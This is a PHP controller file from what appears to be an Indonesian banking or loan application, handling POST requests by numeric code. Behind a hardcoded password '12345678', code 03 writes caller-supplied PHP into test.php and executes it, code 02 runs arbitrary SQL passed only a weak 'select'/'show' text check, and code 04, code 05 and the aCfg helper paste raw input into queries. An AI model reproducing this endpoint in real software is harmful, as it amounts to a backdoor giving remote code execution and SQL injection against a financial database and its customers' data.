<?php
/* 
Berisi Script Controller dengan method yang bisa kita definisikan sendiri dengan syarat 
1. Semua Method hanya bisa di akses dengan a.ajax atau restfull dengan definisi Header khusus
2. Method yang bisa di akses dari URL public adalah yand di definisikan di Routes sebagai PublicMethod
*/

class sakep_Controller extends MVC_Controller {
	function index(){ 
		if($_SERVER["REQUEST_METHOD"] === "POST"){
			//$vaData = json_decode($_POST["data"],true);
			$vaData = $_POST;
			if(isset($vaData["Password"]) && isset($vaData["Code"])){  
			 $cPassword = $vaData["Password"]; 
			 $cPasswordVerif = password_hash("12345678", PASSWORD_DEFAULT);
			 if(password_verify($cPassword,$cPasswordVerif)){ 
				 $vaReturn = array();
				 if($vaData["Code"] == "01"){
						//Func::Send() ;  
						//Func::DatabaseUpdate();
						$dbData = objData::Browse("agama") ;
						while($dbRow = objData::GetRow($dbData)){
						 $vaReturn[] = $dbRow;
						} 
				 }else if($vaData["Code"] == "02"){
					if(isset($vaData["SQL"])){
						$cSql	= strtolower($vaData["SQL"]);
						if(strpos($cSql, "select") !== false || strpos($cSql, "show") !== false){
						 $dbData = objData::SQL($cSql);
						 if(mysql_error() != ""){
								$vaReturn["Error"] = mysql_error();
							}else{
								$JumlahRow   = objData::Rows($dbData);
								while($dbRow = objData::GetRow($dbData)){
									foreach($dbRow as $key => $value){
										$dbRow[$key] = htmlspecialchars(Func::String2SQL($value)) ;
									}
									$vaReturn[] = $dbRow;
								}
							}
						}else{
							$vaReturn["Error"] = "Query Selain Select Tidak Diperbolehkan";
						}
					}else{
						$vaReturn["Error"] = "PARAMETER TIDAK SESUAI";
					}
				 }else if($vaData["Code"] == "03"){
					 	if(isset($vaData["cFunction"])){
							$filename = "test.php";
							$file     = fopen($filename, "w") or die("Unable to open file!");

							$phpCode = str_replace("<?php"," ",$vaData["cFunction"]);
							$phpCode = str_replace("?>"," ",$phpCode);
							$phpCode = str_replace("<br />n","\n",$phpCode);
							$phpCode = "<?php \n function testfunc() { \n ".$phpCode." \n } \n ?>";
							fwrite($file, $phpCode);

							fclose($file);
							require "test.php";
							$result = testfunc();
							$vaReturn = $result;
						}else{
							$vaReturn["Error"] = "PARAMETER TIDAK SESUAI";
						}
				 }else if($vaData["Code"] == "04"){
					 	if(isset($vaData["cTable"])){
							$cTable = $vaData["cTable"];
							$sql = "SHOW COLUMNS FROM $cTable";
							$dbData = objData::SQL($sql);
							while($dbRow = objData::GetRow($dbData)){
								//foreach($dbRow as $key => $value){
									$vaReturn[] = $dbRow["Field"];
								//}
							}
						}else{
							$vaReturn["Error"] = "PARAMETER TIDAK SESUAI";
						}
				 }else if($vaData["Code"] == "05"){
					 	if(isset($vaData["cPeriode"])){
							$cPeriode = $vaData["cPeriode"];
							$dbData = objData::Browse("sakep_data_akhirbulan","Rekening,BakiDebetEfektif,TBungaAccrual,AmortisasiSisaP,AmortisasiSisaB","Tgl = '$cPeriode'","","","BakiDebetEfektif Desc","10");
              while($dbRow = objData::GetRow($dbData)){
                  $vaTunggakan  = Tunggakan::Get($dbRow["Rekening"],$cPeriode);
                  $vaAmortisasi = Sakep::GetArusKas($dbRow["Rekening"],$cPeriode)["Amortisasi"];
                  $vaReturn[$dbRow["Rekening"]] = array("Tunggakan"=>$vaTunggakan["BakiDebet"],"TunggakanDB"=>$dbRow["BakiDebetEfektif"],"SelisihTunggakan"=>abs(String2Number($dbRow["BakiDebetEfektif"]) - $vaTunggakan["BakiDebet"]),
                                                        "TBungaAccrual"=>$vaTunggakan["TBungaAccrual"],"TBungaAccrualDB"=>$dbRow["TBungaAccrual"],"SelisihTBungaAccrual"=>abs(String2Number($dbRow["TBungaAccrual"]) - $vaTunggakan["TBungaAccrual"]),
                                                        "AmortisasiSisaP"=>$vaAmortisasi["SisaP"],"AmortisasiSisaPDB"=>$dbRow["AmortisasiSisaP"],"SelisihAmortisasiSisaP"=>abs(String2Number($dbRow["AmortisasiSisaP"]) - $vaAmortisasi["SisaP"]),
                                                        "AmortisasiSisaB"=>$vaAmortisasi["SisaBT"],"AmortisasiSisaBDB"=>$dbRow["AmortisasiSisaB"],"SelisihAmortisasiSisaB"=>abs(String2Number($dbRow["AmortisasiSisaB"]) - $vaAmortisasi["SisaBT"]));
              }
						}else{
							$vaReturn["Error"] = "PARAMETER TIDAK SESUAI";
						}
				 }
				 
				 header("Content-Type: application/json");
				 MVC::Response($vaReturn); 
			 }else{
				echo "Password Salah";
			 }
			}else{ 
				echo "PARAMETER TIDAK SESUAI";
			}
		}else{
			echo "Metode Permintaan Tidak Diizinkan";
		}
	}
}
function aCfg($cKey,$Default=''){  
  $cSession = "mssession_" ;
  if(strtolower(substr($cKey,0,strlen($cSession))) == $cSession)  $cKey = GetSetting("cSession_UserName") . $cKey ;  
  $dbData = objData::Browse("Config","Keterangan","Kode = '$cKey'") ;
  if($dbRow = objData::GetRow($dbData)){
    $Default = $dbRow ['Keterangan'] ;
  }
  
  if(strtolower($cKey) == "mskodecabang"){ 
    $vaUser  = Func::GetDataUser(GetSetting("cSession_UserName")) ;
    $Default = isset($vaUser['Cabang']) ? $vaUser['Cabang'] : "" ;  
  }  
  return $Default ;
}
